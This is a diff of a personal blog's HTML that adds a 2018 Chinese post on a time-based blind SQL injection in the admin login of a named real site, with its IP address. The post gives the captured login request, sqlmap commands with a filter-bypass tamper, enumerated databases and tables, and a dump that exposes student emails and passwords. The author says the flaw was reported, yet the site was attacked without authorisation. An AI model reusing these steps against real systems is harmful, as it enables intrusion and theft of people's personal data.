@@ -6,14 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.lovebear.top">
-  <title>Archives: 2016 | Blog for You</title>
+  <title>阳光兔后台时间注入--可脱库 | Blog for You</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog for You">
-<meta property="og:url" content="http://www.lovebear.top/archives/2016/index.html">
+  <meta name="description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="阳光兔后台时间注入--可脱库">
+<meta property="og:url" content="http://www.lovebear.top/2018/09/19/Ygtoo_TimeInject/index.html">
 <meta property="og:site_name" content="Blog for You">
+<meta property="og:description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
+<meta property="og:image" content="http://oeqaghyw9.bkt.clouddn.com/ygtoo2.png">
+<meta property="og:image" content="http://oeqaghyw9.bkt.clouddn.com/ygtoo3.png">
+<meta property="og:image" content="http://oeqaghyw9.bkt.clouddn.com/ygtoo4.png">
+<meta property="og:image" content="http://oeqaghyw9.bkt.clouddn.com/ygtoo1.png">
+<meta property="og:updated_time" content="2018-09-19T12:26:37.930Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog for You">
+<meta name="twitter:title" content="阳光兔后台时间注入--可脱库">
+<meta name="twitter:description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
+<meta name="twitter:image" content="http://oeqaghyw9.bkt.clouddn.com/ygtoo2.png">
   
     <link rel="alternative" href="/atom.xml" title="Blog for You" type="application/atom+xml">
   
@@ -161,150 +170,234 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Ygtoo_TimeInject" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      阳光兔后台时间注入--可脱库
+    </h1>
+  
+
+        <a href="/2018/09/19/Ygtoo_TimeInject/" class="archive-article-date">
+  	<time datetime="2018-09-19T11:13:07.968Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-19</time>
+</a>
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址<br><a href="http://182.92.241.143/panel/login.php" target="_blank" rel="external">传送门</a>，当时wooyun上爆出的漏洞<br>是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波<br>紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。</p>
+<a id="more"></a>
+<h2 id="二、脱库过程："><a href="#二、脱库过程：" class="headerlink" title="二、脱库过程："></a>二、脱库过程：</h2><p>手工注入测试出了sql时间注入漏洞，好像只过滤了空格，果断拿出sqlmap进行一下<br>自动脱库。</p>
+<ol>
+<li>首先来看一下漏洞产生的位置，我将提交的表单数据用burp抓了一下，存储到<br>post.txt 留作之后用sqlmap注入。</li>
+</ol>
+<p>下面是我的post.txt文件：</p>
+<pre><code>POST /panel/login.php HTTP/1.1
+Host: 182.92.241.143
+Proxy-Connection: keep-alive
+Content-Length: 57
+Cache-Control: max-age=0
+Origin: http://182.92.241.143
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://182.92.241.143/panel/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: hidden=value; PHPSSID=foidj69smkvieobg8q7an0qsa6
+
+user_name=hjj&amp;password=hjj&amp;loginSubmit=%E7%99%BB%E5%85%A5
+</code></pre><p>发生漏洞的参数为user_name，这里存在注入</p>
+<ol>
+<li>使用sqlmap神器进行数据库类型猜解</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment
+</code></pre><p>得到数据库类型为Mysql<br>P.S. 这里使用了一个tamper脚本，绕过网站的空格过滤机制。</p>
+<ol>
+<li>数据库名的猜解</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql
+</code></pre><p>可以得到三个数据库名</p>
+<pre><code>information_schema
+mysql
+ygtoo
+</code></pre><p>上面两个是mysql自带的数据库，ygtoo中一定是网站的数据库（名字也能看出来）</p>
+<ol>
+<li>数据表的猜解</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
+--tables
+</code></pre><p>只得到了一个数据表</p>
+<pre><code>increment_trx
+</code></pre><p>虽然很奇怪为什么没有其它的，还是继续爆破内容，看看里面是什么再说吧。</p>
+<ol>
+<li>数据表的列的猜解</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
+--T increment_trx --columns
+</code></pre><p>得到了一些列名称</p>
+<pre><code>database
+table
+timestamp
+checkpoint
+jobid
+partition
+</code></pre><p>里面居然有databse和table，看看里面数据究竟有什么</p>
+<ol>
+<li>dump数据</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
+--T increment_trx -C &quot;jobid,table,partition,database,timestamp,checkpoint&quot; --dump
+</code></pre><p><img src="http://oeqaghyw9.bkt.clouddn.com/ygtoo2.png" alt="hjj"><br>可以看到正在dump数据<br><img src="http://oeqaghyw9.bkt.clouddn.com/ygtoo3.png" alt="hjj"><br>最后爆破出数据的结果<br><img src="http://oeqaghyw9.bkt.clouddn.com/ygtoo4.png" alt="hjj"><br>我们在这个表中发现了ygtoo库中其他隐藏的表名！</p>
+<ol>
+<li>猜解qt_student表中的列</li>
+</ol>
+<pre><code>python sqlmap.py -r post.txt --tamper=space2comment --dbms mysql -D ygtoo -T qt_student
+ --columns
+</code></pre><p>这个直接dump不出来，得用sqlmap的爆破猜解方式，我就猜了一小部分（14%）<br><img src="http://oeqaghyw9.bkt.clouddn.com/ygtoo1.png" alt="hjj"><br>可以看到里面有学生的email，密码等敏感信息。</p>
+<p>数据太多了，我就不进行往下拖数据了，主要是没钱买服务器跑脚本qwq</p>
+<h2 id="三、总结："><a href="#三、总结：" class="headerlink" title="三、总结："></a>三、总结：</h2><p>漏洞比较小，当作实战中的练手了，sqlmap确实很强大，要不还得我自己写脚本跑。。。<br>也算是联系了一下sqlmap的使用吧，漏洞已经提交了，希望修复之前不要被别人利用。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://oeqaghyw9.bkt.clouddn.com/url/zhifubao.JPG">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/12/15/notepad++ And python/" class="archive-article-date">
-  	<time datetime="2016-12-15T00:27:34.350Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/12/15/notepad++ And python/">Notepad++配置python环境</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnerability/">Vulnerability</a></li></ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2018/09/19/Ygtoo_TimeInject/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/12/13/Pacman_project1_code/" class="archive-article-date">
-  	<time datetime="2016-12-13T13:37:20.392Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/12/13/Pacman_project1_code/">Pacman_project1代码及解析</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pacman/">pacman</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/12/11/Ubuntu-Python_Version/" class="archive-article-date">
-  	<time datetime="2016-12-11T01:29:35.966Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/12/11/Ubuntu-Python_Version/">Ubuntu Python 默认使用版本改变</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ubuntu/">ubuntu</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/10/08/Hexo-Your-Blog/" class="archive-article-date">
-  	<time datetime="2016-10-08T12:24:30.365Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-10-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/10/08/Hexo-Your-Blog/">Hexo Your Blog</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/09/17/Safari_Dos/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">针对Sarafi的Dos攻击--导致机器重启</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
+</nav>
 
-    
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Ygtoo_TimeInject" data-title="阳光兔后台时间注入--可脱库" data-url="http://www.lovebear.top/2018/09/19/Ygtoo_TimeInject/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"lovebear"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
 
 
           </div>
@@ -332,8 +425,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
